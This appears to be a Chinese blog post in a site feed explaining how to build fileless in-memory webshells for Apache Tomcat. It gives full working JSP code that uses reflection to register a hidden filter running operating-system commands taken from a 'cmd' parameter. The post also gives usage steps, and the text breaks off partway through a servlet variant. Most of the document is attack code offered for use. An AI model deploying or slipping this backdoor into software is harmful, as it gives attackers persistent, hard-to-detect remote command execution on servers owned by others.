  <entry>
    <title>tomcat无文件内存webshell</title>
    <link href="/2021/06/29/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98webshell/"/>
    <url>/2021/06/29/tomcat%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98webshell/</url>
    
    <content type="html"><![CDATA[<h2 id="tomcat三种内存马"><a href="#tomcat三种内存马" class="headerlink" title="tomcat三种内存马"></a>tomcat三种内存马</h2><p>filter型</p><p>servlet型</p><p>listener型</p><p>执行优先级是listener -&gt; filter -&gt; servlet</p><h2 id="filter型内存马原理"><a href="#filter型内存马原理" class="headerlink" title="filter型内存马原理"></a>filter型内存马原理</h2><p>filter是javaweb中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以在filter中写入命令执行的恶意文件，让客户端发来的请求通过它来做命令执行。</p><p>而filter内存马是通过动态注册一个恶意filter，由于是动态注册的，所以这个filter没有文件实体，存在于内存中，随着tomcat重启而消失。</p><p>一般我们把这个filter放在所有filter最前面优先执行，这样我们的请求就不会受到其他正常filter的干扰。</p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>需要动态注册filter就需要几个添加filter相关的函数，ServletContext恰好可以满足这个条件</p><p>javax.servlet.ServletContext</p><p>ServletContext的方法中有addFilter、addServlet、addListener方法，即添加Filter、Servlet、Listener</p><p>获取ServletContext的方法</p><p>this.getServletContext();<br>this.getServletConfig().getServletContext();</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现</p><p>所以需要import这个库，最后我们用到它获取Context</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span>@ page import = <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> <span class="hljs-meta">%</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="filter相关变量"><a href="#filter相关变量" class="headerlink" title="filter相关变量"></a>filter相关变量</h3><p>filterMaps变量：包含所有过滤器的URL映射关系</p><p>filterDefs变量：包含所有过滤器包括实例内部等变量 </p><p>filterConfigs变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span>@ page import = <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> <span class="hljs-meta">%</span>&gt;<br></code></pre></td></tr></table></figure><p>在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef</p><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erb"><span class="xml"><span class="hljs-comment">&lt;!-- tomcat 7 --&gt;</span></span><br><span class="xml">&lt;%</span><span class="ruby">@ page import = <span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> </span><span class="xml">%&gt;</span><br><span class="xml">&lt;%</span><span class="ruby">@ page import = <span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> </span><span class="xml">%&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erb"><span class="xml"><span class="hljs-comment">&lt;!-- tomcat 8/9 --&gt;</span></span><br><span class="xml">&lt;%</span><span class="ruby">@ page import = <span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> </span><span class="xml">%&gt;</span><br><span class="xml">&lt;%</span><span class="ruby">@ page import = <span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>  </span><span class="xml">%&gt;</span><br></code></pre></td></tr></table></figure><h2 id="filter型内存马实现"><a href="#filter型内存马实现" class="headerlink" title="filter型内存马实现"></a>filter型内存马实现</h2><h3 id="filter部分"><a href="#filter部分" class="headerlink" title="filter部分"></a>filter部分</h3><p>先通过一个简单的filter来看一下结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> filter;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">filterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;init filter&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;exec filter&quot;</span>);<br>        filterChain.doFilter(servletRequest,servletResponse);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>filterDemo中有init、doFilter、destroy三个重要方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">init</span><span class="hljs-params">()</span></span>方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。<br><span class="hljs-function"><span class="hljs-title">doFilter</span><span class="hljs-params">()</span></span>方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理<br><span class="hljs-function"><span class="hljs-title">destory</span><span class="hljs-params">()</span></span>方法：在销毁Filter时自动调用<br></code></pre></td></tr></table></figure><p>对我们来说，init和destory不需要做什么，只需要写一个doFilter方法拦截需要的请求，将其参数用于Runtime.getRuntime().exec()做命令执行，并将返回的数据打印到Response中即可，如下例：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>     <span class="hljs-keyword">String</span> cmd = servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>     <span class="hljs-keyword">if</span> (cmd!= <span class="hljs-keyword">null</span>) &#123;<br>         Process process = Runtime.getRuntime().exec(cmd);<br>         java.io.<span class="hljs-keyword">BufferedReader</span> bufferedReader = <span class="hljs-keyword">new</span> java.io.<span class="hljs-keyword">BufferedReader</span>(<br>                 <span class="hljs-keyword">new</span> java.io.InputStreamReader(process.getInputStream()));<br>         StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();<br>         <span class="hljs-keyword">String</span> <span class="hljs-built_in">line</span>;<br>         <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">line</span> = bufferedReader.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>             stringBuilder.<span class="hljs-built_in">append</span>(<span class="hljs-built_in">line</span> + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>         &#125;<br>         servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());<br>         servletResponse.getOutputStream().flush();<br>         servletResponse.getOutputStream().close();<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br>     filterChain.doFilter(servletRequest, servletResponse);<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="动态注册部分"><a href="#动态注册部分" class="headerlink" title="动态注册部分"></a>动态注册部分</h3><p>filter部分写好，下一步就是实现将其注入到内存中</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span><br>ServletContext servletContext =  request.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>;<br>Field appctx = servletContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;<br>appctx.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br>Field stdctx = applicationContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;<br>stdctx.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br>Field Configs = standardContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>)</span>;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Configs</span>.</span></span>set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>Map filterConfigs = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Configs</span>.</span></span>get(standardContext);<br><br>String name = <span class="hljs-string">&quot;filterDemo&quot;</span>;<br><span class="hljs-comment">//判断是否存在filterDemo这个filter，如果没有则准备创建</span><br><span class="hljs-keyword">if</span> (filterConfigs.get(name)<span class="hljs-operator"> == </span>null)&#123;<br>    <span class="hljs-comment">//定义一些基础属性、类名、filter名等</span><br>    filterDemo filter = <span class="hljs-keyword">new</span> filter<span class="hljs-constructor">Demo()</span>;<br>    FilterDef filterDef = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterDef()</span>;<br>    filterDef.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;<br>    filterDef.set<span class="hljs-constructor">FilterClass(<span class="hljs-params">filter</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">Name()</span>);<br>    filterDef.set<span class="hljs-constructor">Filter(<span class="hljs-params">filter</span>)</span>;<br>    <br>    <span class="hljs-comment">//添加filterDef</span><br>    standardContext.add<span class="hljs-constructor">FilterDef(<span class="hljs-params">filterDef</span>)</span>;<br>    <br>    <span class="hljs-comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span><br>    FilterMap filterMap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterMap()</span>;<br>    <span class="hljs-comment">// filterMap.addURLPattern(&quot;/*&quot;);</span><br>    filterMap.add<span class="hljs-constructor">URLPattern(<span class="hljs-string">&quot;/xyz&quot;</span>)</span>;<br>    filterMap.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;<br>    filterMap.set<span class="hljs-constructor">Dispatcher(DispatcherType.REQUEST.<span class="hljs-params">name</span>()</span>);<br>    <br>    <span class="hljs-comment">//添加我们的filterMap到所有filter最前面</span><br>    standardContext.add<span class="hljs-constructor">FilterMapBefore(<span class="hljs-params">filterMap</span>)</span>;<br>    <br>    <span class="hljs-comment">//反射创建FilterConfig，传入standardContext与filterDef</span><br>    Constructor constructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ApplicationFilterConfig</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredConstructor(Context.<span class="hljs-params">class</span>, FilterDef.<span class="hljs-params">class</span>)</span>;<br>    constructor.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">standardContext</span>, <span class="hljs-params">filterDef</span>)</span>;<br>    <br>    <span class="hljs-comment">//将filter名和配置好的filterConifg传入</span><br>    filterConfigs.put(name,filterConfig);<br>    out.write(<span class="hljs-string">&quot;Inject success!&quot;</span>);<br>    &#125;<br><span class="hljs-keyword">else</span>&#123;<br>    out.write(<span class="hljs-string">&quot;Injected!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="完整内存马"><a href="#完整内存马" class="headerlink" title="完整内存马"></a>完整内存马</h3><p>最终jsp文件,只需传到tomcat目录并访问一次，然后再访问其jsp文件../xyz?cmd=whoami即可</p><figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs vbscript-html"><span class="vbscript">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><br><span class="xml"><span class="hljs-comment">&lt;!-- tomcat 8/9 --&gt;</span></span><br><span class="xml"><span class="hljs-comment">&lt;!-- page import = &quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="xml">page import = &quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; --&gt;</span><br><br><span class="xml"><span class="hljs-comment">&lt;!-- tomcat 7 --&gt;</span></span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="vbscript">&lt;%@ page import = <span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;</span><br><br><span class="vbscript">&lt;%</span><br><span class="vbscript">    <span class="hljs-keyword">class</span> filterDemo implements Filter &#123;</span><br><span class="vbscript">        @Override</span><br><span class="vbscript">        <span class="hljs-keyword">public</span> void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="vbscript">        &#125;</span><br><span class="vbscript">        <span class="hljs-keyword">public</span> void <span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="vbscript">            String cmd = servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);</span><br><span class="vbscript">            <span class="hljs-keyword">if</span> (cmd!= <span class="hljs-literal">null</span>) &#123;</span><br><span class="vbscript">                Process process = Runtime.getRun<span class="hljs-built_in">time</span>().exec(cmd);</span><br><span class="vbscript">                java.io.BufferedReader bufferedReader = <span class="hljs-keyword">new</span> java.io.BufferedReader(</span><br><span class="vbscript">                        <span class="hljs-keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="vbscript">                StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();</span><br><span class="vbscript">                String line;</span><br><span class="vbscript">                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;</span><br><span class="vbscript">                    stringBuilder.append(line + <span class="hljs-comment">&#x27;\n&#x27;);</span></span><br><span class="vbscript">                &#125;</span><br><span class="vbscript">                servletResponse.getOutputStream().write(stringBuilder.<span class="hljs-keyword">to</span><span class="hljs-built_in">String</span>().getBytes());</span><br><span class="vbscript">                servletResponse.getOutputStream().flush();</span><br><span class="vbscript">                servletResponse.getOutputStream().close();</span><br><span class="vbscript">                return;</span><br><span class="vbscript">            &#125;</span><br><span class="vbscript">            filterChain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(servletRequest, servletResponse);</span><br><span class="vbscript">        &#125;</span><br><br><span class="vbscript">        @Override</span><br><span class="vbscript">        <span class="hljs-keyword">public</span> void destroy() &#123;</span><br><br><span class="vbscript">        &#125;</span><br><br><span class="vbscript">    &#125;</span><br><span class="vbscript">%&gt;</span><br><br><br><span class="vbscript">&lt;%</span><br><span class="vbscript">    //从org.apache.catalina.core.ApplicationContext反射获取context方法</span><br><span class="vbscript">    ServletContext servletContext =  <span class="hljs-built_in">request</span>.getSession().getServletContext();</span><br><span class="vbscript">    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);</span><br><span class="vbscript">    appctx.setAccessible(<span class="hljs-literal">true</span>);</span><br><span class="vbscript">    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class="hljs-keyword">get</span>(servletContext);</span><br><span class="vbscript">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);</span><br><span class="vbscript">    stdctx.setAccessible(<span class="hljs-literal">true</span>);</span><br><span class="vbscript">    StandardContext standardContext = (StandardContext) stdctx.<span class="hljs-keyword">get</span>(applicationContext);</span><br><span class="vbscript">    Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);</span><br><span class="vbscript">    Configs.setAccessible(<span class="hljs-literal">true</span>);</span><br><span class="vbscript">    Map filterConfigs = (Map) Configs.<span class="hljs-keyword">get</span>(standardContext);</span><br><br><span class="vbscript">    String name = <span class="hljs-string">&quot;filterDemo&quot;</span>;</span><br><span class="vbscript">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span><br><span class="vbscript">    <span class="hljs-keyword">if</span> (filterConfigs.<span class="hljs-keyword">get</span>(name) == <span class="hljs-literal">null</span>)&#123;</span><br><span class="vbscript">        //定义一些基础属性、类名、filter名等</span><br><span class="vbscript">        filterDemo filter = <span class="hljs-keyword">new</span> filterDemo();</span><br><span class="vbscript">        FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();</span><br><span class="vbscript">        filterDef.setFilterName(name);</span><br><span class="vbscript">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="vbscript">        filterDef.<span class="hljs-keyword">set</span><span class="hljs-built_in">Filter</span>(filter);</span><br><br><span class="vbscript">        //添加filterDef</span><br><span class="vbscript">        standardContext.addFilterDef(filterDef);</span><br><br><span class="vbscript">        //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/*</span><br><span class="vbscript">        FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();</span><br><span class="vbscript">        // filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);</span><br><span class="vbscript">        filterMap.addURLPattern(<span class="hljs-string">&quot;/xyz&quot;</span>);</span><br><span class="vbscript">        filterMap.setFilterName(name);</span><br><span class="vbscript">        filterMap.setDispatcher(DispatcherType.<span class="hljs-built_in">REQUEST</span>.name());</span><br><br><span class="vbscript">        //添加我们的filterMap到所有filter最前面</span><br><span class="vbscript">        standardContext.addFilterMapBefore(filterMap);</span><br><br><span class="vbscript">        //反射创建FilterConfig，传入standardContext与filterDef</span><br><span class="vbscript">        Constructor constructor = ApplicationFilterConfig.<span class="hljs-keyword">class</span>.getDeclaredConstructor(Context.<span class="hljs-keyword">class</span>, FilterDef.<span class="hljs-keyword">class</span>);</span><br><span class="vbscript">        constructor.setAccessible(<span class="hljs-literal">true</span>);</span><br><span class="vbscript">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><br><span class="vbscript">        //将filter名和配置好的filterConifg传入</span><br><span class="vbscript">        filterConfigs.put(name,filterConfig);</span><br><span class="vbscript">        out.write(<span class="hljs-string">&quot;Inject success!&quot;</span>);</span><br><span class="vbscript">    &#125;</span><br><span class="vbscript">    <span class="hljs-keyword">else</span>&#123;</span><br><span class="vbscript">        out.write(<span class="hljs-string">&quot;Injected!&quot;</span>);</span><br><span class="vbscript">    &#125;</span><br><span class="vbscript">%&gt;</span><br></code></pre></td></tr></table></figure><p>使用示例</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/filter01.png"></p><p>如果在当前web根目录则不需要寻找上一级目录</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/filter02.png"></p><h2 id="Servlet型内存马实现"><a href="#Servlet型内存马实现" class="headerlink" title="Servlet型内存马实现"></a>Servlet型内存马实现</h2><h3 id="Servlet部分"><a href="#Servlet部分" class="headerlink" title="Servlet部分"></a>Servlet部分</h3><p>一个简单的servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span> </span>&#123;<br>    <br>    <span class="hljs-comment">//当Servlet第一次被创建对象时执行该方法,该方法在整个生命周期中只执行一次</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig arg0)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;init&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//对客户端响应的方法,该方法会被执行多次，每次请求该servlet都会执行该方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;service&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//当Servlet被销毁时执行该方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;destroy&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">//当停止tomcat时销毁servlet。</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>类比filter，在filter型中我们需要在doFilter方法中填入恶意代码</p><p>在servlet中，我们需要在service方法中填入恶意代码，每次访问就会触发命令执行。</p><p>在service填入RuntimeExec和回显的部分，这个servlet就变成了进行命令执行的木马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span></span>&#123;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">return</span> <span 